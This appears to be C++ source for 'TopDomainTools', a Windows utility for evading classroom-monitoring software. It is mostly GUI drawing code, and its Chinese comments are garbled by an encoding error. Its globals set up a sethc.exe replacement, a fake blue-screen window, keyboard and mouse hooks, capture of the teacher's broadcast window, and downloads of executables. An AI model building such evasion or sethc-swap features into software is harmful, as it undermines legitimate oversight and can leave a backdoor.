//����TopDomainTools����Դ��������ļ�
//by zouxiaofei1 2015 - 2020

//ͷ�ļ�
#include "stdafx.h"
#include "GUI.h"
#include "TestFunctions.h"
#include "Hotkey.h"
#include "myProcessHacker.h"
#include "Actions.h"
#include "myPaExec.h"
#pragma comment(lib, "urlmon.lib")//�����ļ��õ�Lib
#pragma comment(lib,"Imm32.lib")//�Զ������뷨λ���õ�Lib
#pragma comment(lib, "ws2_32.lib")//Winsock API ��

#pragma warning(disable:6320)
//����(��Ҫ)������ǰ������
BOOL				InitInstance();//��ʼ��
LRESULT	CALLBACK	WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);//������
LRESULT CALLBACK	CatchProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);//"��׽����"�Ĵ���
LRESULT CALLBACK	ScreenProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);//��ͼαװ����
LRESULT CALLBACK	BSODProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);//����αװ����
LRESULT CALLBACK	FakeProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);//αװ����������
void	CALLBACK	TimerProc(HWND hWnd, UINT nMsg, UINT nTimerid, DWORD dwTime);//��ʱ��
BOOL SearchTool(LPCWSTR lpPath, int type);

//�Լ������ȫ�ֱ��� �е���

//"ȫ��"��ȫ�ֱ���
HINSTANCE hInst;//��ǰʵ����CreateWindow&LoadIconʱ��Ҫ
const wchar_t szWindowClass[] = L"MainWnd",		/*����������*/		CatchWindow[] = L"CatchWnd";/*�ڶ���������*/
const wchar_t ScreenWindow[] = L"ScreenWnd",	/*��ͼαװ��������*/BSODWindow[] = L"BSODWnd";/*αװ������������*/
const wchar_t FakeWindow[] = L"FakeToolBar";	/*αװ��������������*/
BOOL FC = TRUE, FS = TRUE, FB = TRUE, FF = TRUE;//�Ƿ��һ���������ڲ�ע���� C=catch S=screen B=BSOD F=FakeToolBar
BOOL Admin;//�Ƿ�ӵ�й���ԱȨ��
int Bit;//ϵͳλ�� 32 34 64
wchar_t Path[MAX_PATH], Name[MAX_PATH], TDTempPath[] = L"C:\\SAtemp\\";
//����·�� and ·��+������ and ����·�� and sethc����·��(ע��Path�����"\")

//�ͻ�ͼ�йص�ȫ�ֱ���
HBRUSH DBlueBrush, LLGreyBrush, LBlueBrush, WhiteBrush, NormalBlueBrush, LGreyBrush, YellowBrush, DGreyBrush, BSODBrush, BlackBrush;//��ɫ��ˢ
HPEN YellowPen, BlackPen, WhitePen, DGreyPen, DDGreyPen, LGreyPen, CheckGreenPen, NormalGreyPen, DarkGreyPen, NormalBluePen, DBluePen, LBluePen, BSODPen;//��ɫ��
HBITMAP BSODBitmap, CatchBitmap, FakeBitmap;//������hbmp
HDC chdc, ctdc; //�����ڻ���dc & ��ʵdc
HDC shdc, stdc;//��ͼαװ����dc
HDC bhdc, btdc;//����αװ����dc
HDC thdc, ttdc;//��ʹ��CC�Ĵ���ֻ������Щ��ֵ�����(��������= =)
HWND FakeWnd;//������αװ����hWnd
COLORREF crCustColors[16];//��ɫѡ���е��Զ�����ɫ
BOOL LowResource = FALSE;//����Ļ�ֱ��ʽϵ͵ĵ������Զ����ͻ���
BOOL SizingLock;

//��һҳ��ȫ�ֱ���
BOOL OneClick = FALSE;//һ����װ״̬
wchar_t SethcPath[MAX_PATH];//Sethc·��
wchar_t TDPath[MAX_PATH], TDName[MAX_PATH];//����·�� and Ĭ�ϼ��������
BOOL TDsearched = FALSE;//�Ƿ��Ѿ�Ѱ�ҹ�����?
BOOL SethcState = TRUE;//System32Ŀ¼��sethc�Ƿ����
BOOL SethcInstallState = FALSE;//Sethc����״̬
BOOL HookState = FALSE, FirstHook = TRUE;//ȫ�ּ��̹��ӷ���״̬
BOOL FirstFlag;//�Ƿ�����̨�����ϵ�һ������?(����sethc�Ƿ񱸷ݹ����)
wchar_t ExplorerPath[] = L"C:\\Windows\\explorer";//����ϵͳλ����explorer·��
wchar_t szVDesk[] = L"TDTdesk", fBSODdesk[] = L"TDTBSOD";//�������� & ����αװ�������������
BOOL NewDesktop = FALSE;//�Ƿ�����������?

//�ڶ�����ҳ��ȫ�ֱ���
BOOL GameMode;//��Ϸģʽ�Ƿ��?
constexpr int numGames = 6;// (��Ϸ)��
BOOL GameExist[numGames + 1];//��ǵ��ļ��Ƿ����?
constexpr wchar_t GameName[numGames + 1][12]{ L"xiaofei.exe", L"fly.exe",L"2048.exe",\
L"block.exe", L"1.exe" , L"chess.exe",L"14Kwds.ini" };//(��Ϸ)��
constexpr wchar_t GameURLsuffix[numGames + 1][3]{ L"95", L"88",L"61",\
L"72", L"50" , L"80",L"25" };//���Ӻ�׺
BOOL GameButtonLock = FALSE;//Game��ť����
constexpr wchar_t GameURLprefix[] = L"http://www.zlian.ga/u/15993785";//��Ϸ�洢��Ŀ¼

DWORD TDPID;//��¼�������PID
BOOL FakeToolbarNew;//��ʾ���Ƿ����°汾��αװ������
DWORD FakeTimer;//��¼αװ����������ʱ��ı���
BOOL FakenewUp = FALSE;//αװ�������Ƿ����� - �տ�ʼʱΪFALSE
BOOL FakeThreadLock = FALSE;//αװ���������������߳���
HANDLE DeleteFileHandle;//�ļ�ɾ���������

//����ҳ��ȫ�ֱ���
HBITMAP hZXFsign;//xiaofeiǩ��ͼƬ���
int EasterEggState;//CopyLeft����ѭ��״̬
BOOL EasterEggFlag = FALSE;//�Ƿ���ʾ����ѭ��
constexpr char EasterEggStr[11][8]{ "Answer","Left" ,"Left",\
"Right","Down","Up","In","On","Back","Front","Teacher" };//������ʾ���ַ�
BOOL InfoChecked = FALSE;//�Ƿ��Ѿ�����ϵͳ��Ϣ

//����ҳ��ȫ�ֱ���
int ScreenState;//��ͼαװ״̬ 1 = ��ͼ 2 = ��ʾ
HHOOK KeyboardHook, MouseHook;//���̡���깳��
int HideState;//�����Ƿ�����
HWND FileList;//����ѡ��hWnd
BOOL TOP;//�Ƿ��ö�

//��׽���� & αװ���������ȫ�ֱ���
HWND CatchWnd;//��׽���ڵĴ��ھ��
HWND TDhWndChild, TDhWndParent, TDhWndGrandParent;//����㲥�����Ӵ���hWnd & ����㲥����hWnd
int CatchWndTimerLeft = -2;//��׽���ڵ���ʱ
Map<int, BOOL>Eatpid;//��¼��׽����hWnd��map
HWND EatList[101];//����׽�Ĵ��ڵ�hWnd����ѹ�����"ջ"
Map<int, BOOL>expid, tdpid;//explorer PID + �����Ӵ��� PID
HWND MonitorList[101]; //�����Ӵ���hWnd
int MonitorTot, MonitorCur;//�����Ӵ������� + ���ڱ����ӵĴ��ڱ��
int TopCount;//CatchWnd�����ö��ӳٱ���
int sdl = 5;//systemdefaultlanguage
constexpr int QRcode[]{ 0x1fc9e7f,0x1053641,0x175f65d,0x174e05d,0x175075d,0x105a341,0x1fd557f,0x19500,0x1a65d76,0x17a6dc1,0x18ec493,0x1681960,
0x1471bcb,0x2255ed,0x17c7475,0xea388a,0x18fd1fc,0x1f51d,0x1fd8b53,0x104d51d,0x1745df2,0x1751d14,0x174ce1d,0x1056dc8,0x1fd9ba3
};//�Ų�������һ����ά��= =
const char word1[] = "A problem has been detected and windows has been shut down to prevent damage to your computer. ", word2[] = "IRQL_NOT_LESS_OR_EQUAL ",
word3[] = "An executive worker thread is being terminated without having gone through the worker thread rundown code.work items queued to the Ex worker queue must not terminate their threads.A stack trace should indicate the culprit. ",
word4[] = "If this is the first time you've seen this Stop error screen, restart your computer. If this screen appears again, follow these steps: "
, word5[] = "Check to make sure any new hardware of software is properly installed. If this is new installation, ask your hardware or software manufacturer for any windows updates you might need. "
, word6[] = "If problems continue,disable or remove any newly installed hardware or software. Disable BIOS memory options such as caching or shadowing.\
 If you need to use Safe Mode to remove or disable components, restart your computer, press F8 to select Advanced Startup Options, and then select Safe Mode. ",
	word7[] = "Technical information: ", word8[] = "*** STOP: 0x0000000A (0x00000000,0xD0000002, 0x00000001,0x8082C582)", word9[] = "*** wdf01000.sys - Address 97C141AC base at 97C0E000, DateStamp 4fd91f51 ", * words[9] = { word1,word2,word3 ,word4 ,word5 ,word6 ,word7 ,word8,word9 };
int BSODstate;//����������ʾ�ı��
HWND BSODhwnd;//���������hWnd

//����ȫ�ֱ���
int ColorChangingState = 1;
int ColorChangingLeft = 5;
int xLength, yLength;
Mypair DragState;
POINT DragDefPoint;
byte strWmap[65536];//��¼�ַ���ȵ�����
BOOL slient = FALSE;//�Ƿ�������
HANDLE hdlWrite;//�����д��ڵľ��
RECT UTrc;//UT"����"��ͼ��λ��
BOOL UTState = FALSE;//�Ƿ�����"�����ö�"
BOOL UTCheck = FALSE;//�Ƿ��Ѿ�������"�����ö�"��һ��Check
HDC DeskDC;//����DC
HWND Deskwnd;//����hWnd
BOOL LButtonDown;//��¼�������Ƿ���
POINT UTMpoint;//��¼�������
POINT UTMpoint2;
BOOL FE = true;


//���¼���ΪClass��λ��


class CathyClass//�ؼ�����
{
public:
	void InitClass(HINSTANCE HInstance)
	{
		hInstance = HInstance;//����hInst
		CurButton = CurFrame = CurCheck = CurLine = CurText = CurArea = CurEdit = 0;
		Obredraw = TRUE;
		Msv = 0;
		CurWnd = 1;//��"��"
		CoverButton = -1;
		Main.DPI = 1;
		ExpLine = ExpHeight = ExpWidth = 0;
	}
	__forceinline wchar_t* GetStr(LPCWSTR ID) { return str[Hash(ID)]; }//ͨ��Hash + map �����������ַ��������ݽṹ		
																	   //ID(�����������ַ���) -> Hash -(map)> �ַ�����ַ

	void SetStr(LPCWSTR Str, LPCWSTR ID)//ͨ��ID�����ַ���
	{
		const unsigned int HashTemp = Hash(ID);
		if (str[HashTemp] != 0)HeapFree(GetProcessHeap(), 0, str[HashTemp]);//ɾ����ǰID��ԭ�е��ַ���
		str[HashTemp] = (wchar_t*)HeapAlloc(GetProcessHeap(), 0, sizeof(wchar_t) * (mywcslen(Str) + 1));//������Ӧ���ڴ�ռ�
		mywcscpy(str[HashTemp], Str);//�����µ�
	}

	void CreateString(LPCWSTR Str, LPCWSTR ID)//�������ַ���
	{//ע��:Ӧ����ʹ�ó�����ʼ��ʱʹ�ñ�����,�ñ�����ʼ���ǽ���CurString++����SetStr
		++CurString;
		if (Str != NULL)//Ĭ�Ͻ�����ָ��(Σ��!)
#ifdef _DEBUG
			str[Hash(ID)] = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(wchar_t) * (mywcslen(Str) + 1)),
			mywcscpy(str[Hash(ID)], Str);
#elif _WIN64
			str[Hash(ID)] = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(wchar_t) * (mywcslen(Str) + 1)),
			mywcscpy(str[Hash(ID)], Str);
#else
			str[Hash(ID)] = (LPWSTR)Str;
#endif
	}
	void CreateEditEx(int Left, int Top, int Wid, int Hei, int Page, LPCWSTR name, HFONT Font, BOOL Ostr)
	{//�����Ի������
		++CurEdit;
		Edit[CurEdit].Left = Left; Edit[CurEdit].Top = Top;
		Edit[CurEdit].Width = Wid; Edit[CurEdit].Height = Hei;
		Edit[CurEdit].Page = Page;//���ó���λ�õ���Ϣ

		if (Ostr)
		{//���û�ɫ��ʶ����ʾ�ַ���
			mywcscpy(Edit[CurEdit].OStr, name);
			Edit[CurEdit].font = Font;//����ʾ�ַ���ʱ�����������ַ���
			Edit[CurEdit].str = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 8);
		}
		else//û����ʾ�ַ���:
			SetEditStrOrFont(name, Font, CurEdit);
	}
	void CreateArea(int Left, int Top, int Wid, int Hei, int Page)//�����������
	{
		++CurArea;//���ó���λ�õ���Ϣ
		Area[CurArea].Left = Left; Area[CurArea].Top = Top;
		Area[CurArea].Width = Wid; Area[CurArea].Height = Hei;
		Area[CurArea].Page = Page;
	}
	void CreateButtonEx(int Number, int Left, int Top, int Wid, int Hei, int Page, LPCWSTR name, HBRUSH Leave, \
		HBRUSH Hover, HBRUSH press, HPEN Leave2, HPEN Hover2, HPEN Press2, HFONT Font, BOOL Enabled, BOOL Dshadow, COLORREF FontRGB, LPCWSTR ID)
	{//������ť�ĸ��Ӻ���...
		Button[Number].Left = Left; Button[Number].Top = Top;//��������
		Button[Number].Width = Wid; Button[Number].Height = Hei;
		Button[Number].Page = Page; Button[Number].Leave = Leave;
		Button[Number].Hover = Hover; Button[Number].Press = press;//�뿪 & ���� & ��� , HBRUSH & HPEN
		Button[Number].Leave2 = Leave2; Button[Number].Hover2 = Hover2;
		Button[Number].Press2 = Press2; Button[Number].Font = Font;
		Button[Number].Enabled = Enabled; Button[Number].FontRGB = FontRGB;
		mywcscpy(Button[Number].Name, name); mywcscpy(Button[Number].ID, ID); but[Hash(ID)] = Number;
		Button[Number].Shadow = Dshadow;

		LOGBRUSH LogBrush;//��HBRUSH����ȡ��RGB��ɫ
		LOGPEN LogPen;//	(����ɫ��Ҫ)
		GetObject(Leave, sizeof(LogBrush), &LogBrush); Button[Number].b1[0] = GetRValue(LogBrush.lbColor);
		Button[Number].b1[1] = GetGValue(LogBrush.lbColor); Button[Number].b1[2] = GetBValue(LogBrush.lbColor);
		GetObject(Hover, sizeof(LogBrush), &LogBrush); Button[Number].b2[0] = GetRValue(LogBrush.lbColor);
		Button[Number].b2[1] = GetGValue(LogBrush.lbColor); Button[Number].b2[2] = GetBValue(LogBrush.lbColor);
		GetObject(Leave2, sizeof(LogPen), &LogPen); Button[Number].p1[0] = GetRValue(LogPen.lopnColor);
		Button[Number].p1[1] = GetGValue(LogPen.lopnColor); Button[Number].p1[2] = GetBValue(LogPen.lopnColor);
		GetObject(Hover2, sizeof(LogPen), &LogPen); Button[Number].p2[0] = GetRValue(LogPen.lopnColor);
		Button[Number].p2[1] = GetGValue(LogPen.lopnColor); Button[Number].p2[2] = GetBValue(LogPen.lopnColor);
	}
	void CreateButton(int Left, int Top, int Wid, int Hei, int Page, LPCWSTR name, LPCWSTR ID)//������ť���򻯰棩
	{
		++CurButton;//�����name Wid Hei ����ȫ������Ϊ����"������ȫ������"
		Button[CurButton].Left = Left; Button[CurButton].Top = Top;//��������
		Button[CurButton].Width = Wid; Button[CurButton].Height = Hei;
		Button[CurButton].Page = Page; mywcscpy(Button[CurButton].Name, name);
		Button[CurButton].Enabled = TRUE; Button[CurButton].Shadow = 1 | 2;
		mywcscpy(Button[CurButton].ID, ID); but[Hash(ID)] = CurButton;
		Button[CurButton].Leave2 = Button[CurButton].Hover2 = Button[CurButton].Press2 = BlackPen;
		Button[CurButton].Leave = WhiteBrush; Button[CurButton].Hover = DBlueBrush; Button[CurButton].Press = LBlueBrush;
		Button[CurButton].b1[0] = Button[CurButton].b1[1] = Button[CurButton].b1[2] = 255;
		Button[CurButton].b2[0] = 210; Button[CurButton].b2[1] = Button[CurButton].b2[2] = 255;
	}
	void CreateFrame(int Left, int Top, int Wid, int Hei, int Page, LPCWSTR name)//�������ݿ�
	{//���ó���λ�õ���Ϣ
		++CurFrame;//															-- Example ------
		Frame[CurFrame].Left = Left; Frame[CurFrame].Page = Page;//			    |				|
		Frame[CurFrame].Height = Hei; Frame[CurFrame].Top = Top;//			    |				|
		Frame[CurFrame].Width = Wid;//										    |				|
		mywcscpy(Frame[CurFrame].Name, name);//								    -----------------
	}
	void CreateCheck(int Left, int Top, int Page, int Wid, LPCWSTR name)//����"��"
	{
		++CurCheck;//����(û�г���)λ�õ���Ϣ
		Check[CurCheck].Left = Left; Check[CurCheck].Top = Top;
		Check[CurCheck].Page = Page; Check[CurCheck].Width = Wid;
		mywcscpy(Check[CurCheck].Name, name);
	}
	void CreateText(int Left, int Top, int Page, LPCWSTR name, COLORREF rgb)//����ע������
	{
		++CurText;
		Text[CurText].Left = Left; Text[CurText].Top = Top;
		Text[CurText].Page = Page; Text[CurText].rgb = rgb;
		mywcscpy(Text[CurText].Name, name);
	}
	void CreateLine(int StartX, int StartY, int length, BOOL focus, int Page, COLORREF rgb)//�����߶�
	{//ע��:Createϵ�к�������Ķ��� ԭʼ ���꣬
		++CurLine;//����DPI����ϵͳ��Ӱ��
		Line[CurLine].StartX = StartX; Line[CurLine].StartY = StartY;
		Line[CurLine].Length = length; Line[CurLine].Focus = focus;//(Drawϵ�к����������Ź�������)
		Line[CurLine].Page = Page; Line[CurLine].Color = rgb;
	}
	BOOL InsideButton(int cur, POINT& point)//���ݴ����Point�ж����ָ���Ƿ��ڰ�ť��
	{//cur:��ť�ı�ţ�����ID
		return (Button[cur].Left * DPI <= point.x && Button[cur].Top * DPI <= point.y && (long)((Button[cur].Left + Button[cur].Width) * DPI) >= point.x && (long)((Button[cur].Top + Button[cur].Height) * DPI) >= point.y);
	}
	int InsideCheck(int cur, POINT& point)//ͬ�� �ж����ָ���Ƿ���check��
	{
		if (Check[cur].Left * DPI <= point.x && Check[cur].Top * DPI <= point.y && Check[cur].Left * DPI + 15 * DPI + 1 >= point.x
			&& Check[cur].Top * DPI + 15 * DPI + 1 >= point.y)return 1;//��check�ķ�����

		if (Check[cur].Left * DPI <= point.x && Check[cur].Top * DPI <= point.y && Check[cur].Left * DPI + Check[cur].Width * DPI >= point.x
			&& Check[cur].Top * DPI + 15 * DPI + 1 >= point.y)return 2;//��check�����Ҳ�һ��������
		return 0;//�ı߶�����
	}
	void DrawFrames(int cur)//����Frames
	{
		int i; RECT UPrc{0};
		if (cur != 0) { i = cur; goto begin; }//���ʹ��ObjectRedraw����������Frame
		GetUpdateRect(hWnd, &UPrc, false);
		for (i = 1; i <= CurFrame; ++i)
		{
		begin:
			if (Frame[i].Page == CurWnd || Frame[i].Page == 0)
			{
				if (UPrc.right != 0)if (UPrc.right > (long)((Frame[i].Left + Frame[i].Width) * DPI) &&
					UPrc.left< (long)(Frame[i].Left * DPI) && UPrc.bottom>(long)((Frame[i].Top + Frame[i].Height) * DPI)
					&& UPrc.top < (long)(Frame[i].Top * DPI))continue;
				SelectObject(hdc, BlackPen);//���Ʒ���
				SelectObject(hdc, DefFont);
				MoveToEx(hdc, (int)(Frame[i].Left * DPI), (int)(Frame[i].Top * DPI), NULL);//��ӵ�(int)xx*DPI ���پ���
				LineTo(hdc, (int)(Frame[i].Left * DPI), (int)(Frame[i].Top * DPI + Frame[i].Height * DPI));
				LineTo(hdc, (int)(Frame[i].Left * DPI + Frame[i].Width * DPI), (int)(Frame[i].Top * DPI + Frame[i].Height * DPI));
				LineTo(hdc, (int)(Frame[i].Left * DPI + Frame[i].Width * DPI), (int)(Frame[i].Top * DPI));
				LineTo(hdc, (int)(Frame[i].Left * DPI), (int)(Frame[i].Top * DPI));
				SetTextColor(hdc, Frame[i].rgb);//�Զ���������ɫ
				RECT rc = GetRECTf(i);
				SetBkMode(hdc, OPAQUE);//��ӡ�Ϸ�����
				DrawTextW(hdc, Frame[i].Name, (int)mywcslen(Frame[i].Name), &rc, NULL);
			}
			if (cur != 0)return;
		}
	}
	void DrawButtons(int cur)//���ư�ť
	{
		RECT UPrc = { 0 };
		int i;//���ʹ��ObjectRedraw����������Button
		if (cur != 0) { i = cur; goto begin; }//�ṹʾ�⣺ѡ����ɫ(���� or ���� or Ĭ��) -> ѡ������

		GetUpdateRect(hWnd, &UPrc, false);
		for (i = 0; i <= CurButton; ++i)//				-> ���Ʒ��� -> (�������ؽ�����) -> �������� -> ����
		{
		begin://										(��������������ʱ�����ؽ��������ֿ�ɾ��)

			if (Button[i].Page == CurWnd || Button[i].Page == 0)
			{
				if (Width < Button[i].Left)continue;
				if (UPrc.right != 0)if (UPrc.right > (long)((Button[i].Left + Button[i].Width) * DPI) &&
					UPrc.left< (long)(Button[i].Left * DPI) && UPrc.bottom>(long)((Button[i].Top + Button[i].Height) * DPI)
					&& UPrc.top < (long)(Button[i].Top * DPI))continue;

				HPEN TmpPen = 0; HBRUSH TmpBrush = 0;
				if (Button[i].Enabled == FALSE)//��������ʾ��ɫ
				{
					SelectObject(hdc, DGreyBrush);
					SelectObject(hdc, Button[i].Leave2);
					SetTextColor(hdc, COLOR_DARKEST_GREY);
					goto colorok;//ֱ����������ɫ
				}
				SetTextColor(hdc, Button[i].FontRGB);
				if (Button[i].Percent != 0 && Button[i].Percent != 100 && Button[i].DownTot == 0)//����ɫ����
				{
					TmpPen = CreatePen(PS_SOLID, 1, RGB((Button[i].p2[0] - Button[i].p1[0]) * Button[i].Percent / 100 + Button[i].p1[0], \
						(Button[i].p2[1] - Button[i].p1[1]) * Button[i].Percent / 100 + Button[i].p1[1], (Button[i].p2[2] - Button[i].p1[2]) * Button[i].Percent / 100 + Button[i].p1[2]));
					//��ʱ�������ʺͻ�ˢ
					SelectObject(hdc, TmpPen);
					TmpBrush = CreateSolidBrush(RGB((Button[i].b2[0] - Button[i].b1[0]) * Button[i].Percent / 100 + Button[i].b1[0], \
						(Button[i].b2[1] - Button[i].b1[1]) * Button[i].Percent / 100 + Button[i].b1[1], (Button[i].b2[2] - Button[i].b1[2]) * Button[i].Percent / 100 + Button[i].b1[2]));
					SelectObject(hdc, TmpBrush);
					goto colorok;
				}
				if (CoverButton == i && Button[i].DownTot == 0)//û�н��� Ҳû�н���ɫ -> Ĭ����ɫ
					if (Press) {
						SelectObject(hdc, Button[i].Press);//���°�ť
						SelectObject(hdc, Button[i].Press2);
					}
					else {
						SelectObject(hdc, Button[i].Hover);//����
						SelectObject(hdc, Button[i].Hover2);
					}
				else
				{
					SelectObject(hdc, Button[i].Leave);//�뿪
					SelectObject(hdc, Button[i].Leave2);
				}

			colorok:
				if (Button[i].Font == NULL)SelectObject(hdc, DefFont); else SelectObject(hdc, Button[i].Font);//����

				Rectangle(hdc, (int)(Button[i].Left * DPI + 0.5), (int)(Button[i].Top * DPI + 0.5),
					(int)(Button[i].Left * DPI + Button[i].Width * DPI), (int)(Button[i].Top * DPI + Button[i].Height * DPI));//���Ʒ���

				if (Button[i].DownTot != 0)//���ؽ�����
				{
					SelectObject(hdc, Button[i].Hover);
					Rectangle(hdc, (int)(Button[i].Left * DPI), (int)(Button[i].Top * DPI),
						(int)(Button[i].Left * DPI + Button[i].Width * DPI * (Button[i].Download - 1) / 100), (int)(Button[i].Top * DPI + Button[i].Height * DPI));
				}

				if (Button[i].Shadow && ButtonEffect)//�ڰ�ť�����·���һȦ��Ӱ
				{
					SelectObject(hdc, DDGreyPen);
					MoveToEx(hdc, (int)(Button[i].Left * DPI + Button[i].Width * DPI), (int)(Button[i].Top * DPI + 0.5), 0);
					LineTo(hdc, (int)(Button[i].Left * DPI + Button[i].Width * DPI), (int)(Button[i].Top * DPI + Button[i].Height * DPI));
					LineTo(hdc, (int)(Button[i].Left * DPI + 0.5) - 1, (int)(Button[i].Top * DPI + Button[i].Height * DPI));

					SelectObject(hdc, DGreyPen);
					MoveToEx(hdc, (int)(Button[i].Left * DPI + Button[i].Width * DPI) + 1, (int)(Button[i].Top * DPI + 0.5), 0);
					LineTo(hdc, (int)(Button[i].Left * DPI + Button[i].Width * DPI) + 1, (int)(Button[i].Top * DPI + Button[i].Height * DPI) + 1);
					LineTo(hdc, (int)(Button[i].Left * DPI + 0.5), (int)(Button[i].Top * DPI + Button[i].Height * DPI) + 1);

					SelectObject(hdc, LGreyPen);
					MoveToEx(hdc, (int)(Button[i].Left * DPI + Button[i].Width * DPI) + 2, (int)(Button[i].Top * DPI + 0.5), 0);
					LineTo(hdc, (int)(Button[i].Left * DPI + Button[i].Width * DPI) + 2, (int)(Button[i].Top * DPI + Button[i].Height * DPI) + 1);
					MoveToEx(hdc, (int)(Button[i].Left * DPI + Button[i].Width * DPI) + 1, (int)(Button[i].Top * DPI + Button[i].Height * DPI) + 2, 0);
					LineTo(hdc, (int)(Button[i].Left * DPI + 0.5), (int)(Button[i].Top * DPI + Button[i].Height * DPI) + 2);
				}

				RECT rc = GetRECT(i);

				SetBkMode(hdc, TRANSPARENT);//ȥ�����ֱ���
				if (Button[i].DownTot == 0)//��ӡ����(Ĭ��)
				{
					if (CoverButton == i)
					{
						rc.left += 2; /*rc.top += 2; */if (Press)rc.top += 2;
					}
					DrawTextW(hdc, Button[i].Name, (int)mywcslen(Button[i].Name), &rc, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
				}
				else
				{//��������
					if (Button[i].Download >= 101 && (Button[i].DownTot == Button[i].DownCur))
					{//��ȫ���������
						DrawTextW(hdc, GetStr(L"Loaded"), 4, &rc, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
						Button[i].Download = Button[i].DownTot = Button[i].DownCur = 0;
					}
					else
					{
						if (Button[i].DownTot < 2)//�������� (����Ϊ1)
							DrawTextW(hdc, GetStr(L"Loading"), 4, &rc, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
						else
						{
							wchar_t TempStr[20], TempNumber[MAX_NUM];//�������� (�����ظ���)/(����)
							myZeroMemory(TempNumber, sizeof(wchar_t) * MAX_NUM);
							mywcscpy(TempStr, GetStr(L"Loading"));
							myitow(Button[i].DownCur, TempNumber, MAX_NUM);
							mywcscat(TempStr, TempNumber);
							mywcscat(TempStr, L"/");//ƴ���ַ���
							myitow(Button[i].DownTot, TempNumber, MAX_NUM);
							mywcscat(TempStr, TempNumber);
							DrawTextW(hdc, TempStr, (int)mywcslen(TempStr), &rc, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
						}
					}
				}
				if (TmpPen != NULL)DeleteObject(TmpPen);//���վ��
				if (TmpBrush != NULL)DeleteObject(TmpBrush);
			}

			if (cur != 0)return;//ʹ��ObjectRedrawʱֱ�ӽ���
		}
		SetTextColor(hdc, COLOR_BLACK);
	}
	void DrawChecks(int cur)//����Checks
	{
		RECT UPrc{0};
		int i;
		if (cur != 0) { i = cur; goto begin; }//���ʹ��ObjectRedraw����������Check
		GetUpdateRect(hWnd, &UPrc, false);
		for (i = 1; i <= CurCheck; ++i)
		{
		begin:
			if (Check[i].Page == 0 || Check[i].Page == CurWnd)
			{
				if (UPrc.right != 0)if (UPrc.right > (long)((Check[i].Left + Check[i].Width) * DPI) &&
					UPrc.left< (long)(Check[i].Left * DPI) && UPrc.bottom>(long)((Check[i].Top + 15) * DPI)
					&& UPrc.top < (long)(Check[i].Top * DPI))continue;
				if (Check[i].Value)SetTextColor(hdc, COLOR_DARKEST_GREY); else SetTextColor(hdc, COLOR_BLACK);
				if (i == CoverCheck)SelectObject(hdc, NormalBluePen); else SelectObject(hdc, NormalGreyPen);

				SelectObject(hdc, LGreyBrush);
				SelectObject(hdc, DefFont);//checkĬ�ϱ߳�Ϊ15�������ܵ���
				Rectangle(hdc, (int)(Check[i].Left * DPI), (int)(Check[i].Top * DPI), (int)(Check[i].Left * DPI + 15 * DPI), (int)(Check[i].Top * DPI + 15 * DPI));
				SelectObject(hdc, WhiteBrush);
				SelectObject(hdc, WhitePen);
				Rectangle(hdc, (int)((Check[i].Left + 15) * DPI), (int)(Check[i].Top * DPI), (int)(Check[i].Left * DPI + Check[i].Width * DPI), (int)(Check[i].Top * DPI + 15 * DPI));
				TextOut(hdc, (int)(Check[i].Left * DPI + 20 * DPI), (int)(Check[i].Top * DPI), Check[i].Name, (int)mywcslen(Check[i].Name));
				if (Check[i].Value == 1)//��LineTo�򵥵ش�
				{						//�Ƚ��ѿ�
					SelectObject(hdc, CheckGreenPen);//�Թ���ֱ����ͼ�����ѿ�
					MoveToEx(hdc, (int)(Check[i].Left * DPI + 2 * DPI), (int)(Check[i].Top * DPI + 7 * DPI), NULL);//����ֻ�������� = =
					LineTo(hdc, (int)(Check[i].Left * DPI + 6 * DPI), (int)(Check[i].Top * DPI + 12 * DPI));
					LineTo(hdc, (int)(Check[i].Left * DPI + 12 * DPI), (int)(Check[i].Top * DPI + 3 * DPI));
				}
			}
			if (cur != 0)return;
		}
	}

	void DrawLines()//�����߶�
	{//�߶�һ�㲻��Ҫ�ػ�
		for (int i = 1; i <= CurLine; ++i)//���û�м�ObjectRedraw
			if (Line[i].Page == 0 || Line[i].Page == CurWnd)
			{
				HPEN tmpPen = CreatePen(0, 1, Line[i].Color);
				SelectObject(hdc, tmpPen);//ֱ����LineTo
				MoveToEx(hdc, (int)(Line[i].StartX * DPI), (int)(Line[i].StartY * DPI), NULL);
				LineTo(hdc, (int)(Line[i].StartX * DPI + (!Line[i].Focus * Line[i].Length) * DPI), (int)(Line[i].StartY * DPI + (Line[i].Focus * Line[i].Length) * DPI));
				DeleteObject(tmpPen);
			}
	}
	void DrawTexts(int cur)//��������
	{
		int i;
		if (cur != 0) { i = cur; goto begin; }//���ʹ��ObjectRedraw����������Texts
		for (i = 1; i <= CurText; ++i)
		{
		begin:
			if (Text[i].Page == 0 || Text[i].Page == CurWnd)
			{

				SetTextColor(hdc, Text[i].rgb);
				SelectObject(hdc, DefFont);//���ֵ���������Ч����̫����
				wchar_t* TempText = str[Hash(Text[i].Name)];
				TextOutW(hdc, (int)(Text[i].Left * DPI), (int)(Text[i].Top * DPI), TempText, (int)mywcslen(TempText));
			}
			if (cur != 0)return;
		}
	}
#pragma warning(disable:26495)//����"ʼ�ճ�ʼ����Ա����"�ľ���
	void DrawExp()//����ע��
	{//ע��ֻ��һ������˲���ҪObjectRedraw
		if (!ExpExist)return;//ע�Ͳ�����?
		SelectObject(hdc, DefFont);
		SelectObject(hdc, YellowPen);//ѡ��ע��ר�õĻ�ɫ����
		SelectObject(hdc, YellowBrush);
		Rectangle(hdc, ExpPoint.x, ExpPoint.y, ExpWidth + ExpPoint.x, ExpHeight + ExpPoint.y + 2);
		SetTextColor(hdc, COLOR_BLACK);//���д�ӡ
		for (int i = 1; i <= ExpLine; ++i)//ע�������ExpPoint , ExpWidth�ȶ������ź�����
			TextOutW(hdc, ExpPoint.x + 4, (int)(ExpPoint.y - 12 * DPI + 16 * i * DPI + 2 * i), Exp[i], (int)mywcslen(Exp[i]));
	}
